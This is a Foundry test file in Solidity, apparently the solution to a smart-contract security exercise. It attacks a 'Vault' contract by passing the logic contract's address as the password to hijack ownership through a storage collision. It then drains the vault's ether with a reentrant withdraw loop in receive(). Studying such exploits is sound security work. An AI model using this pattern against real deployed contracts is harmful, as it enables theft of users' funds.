// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Test, console} from "forge-std/Test.sol";
import {VaultLogic, Vault} from "../src/Vault.sol";

contract VaultTest is Test {
    VaultLogic public logic;
    Vault public vault;

    function setUp() public {
        address owner = makeAddr("owner");
        bytes32 password = "password";
        vm.startPrank(owner);
        logic = new VaultLogic(password);
        vault = new Vault(address(logic));
        vm.stopPrank();
    }

    function test_Attack() public {
        deal(address(vault), 3 ether);
        console.log("contract balance:", address(vault).balance);
        console.log("vault:", address(vault).balance);
        address attacker = makeAddr("attacker");
        console.log("attacker:", attacker.balance);
        deal(attacker, 1 ether);
        vm.startPrank(attacker);
        // Change the owner of Vault to attacker
        (bool success, ) = address(vault).call(
            abi.encodeWithSignature(
                "changeOwner(bytes32,address)",
                bytes32(uint256(uint160(address(logic)))),
                attacker
            )
        );
        if (!success) revert();
        console.logAddress(vault.owner());
        // Desposit 1 ether in Vault, change attacker's balance in Vault
        vault.deposite{value: 1 ether}();
        // the owner can withdraw
        vault.openWithdraw();
        // Withdraw the balance
        vm.stopPrank();
        vm.startPrank(address(this));
        uint balance = address(this).balance;

        console.log(address(this).balance);

        vault.deposite{value: 1 ether}();
        vault.withdraw();

        assertEq(address(this).balance, balance + 4 ether);

        console.log("vault:", address(vault).balance);
        console.log(address(this).balance);
    }

    receive() external payable {
        // console.log("Reentrant attack");

        // Reentrant attack
        if (address(vault).balance >= 1 ether) {
            vault.withdraw();
        }
        // console.log("Reentrant attack success");
    }

    fallback() external payable {}
}
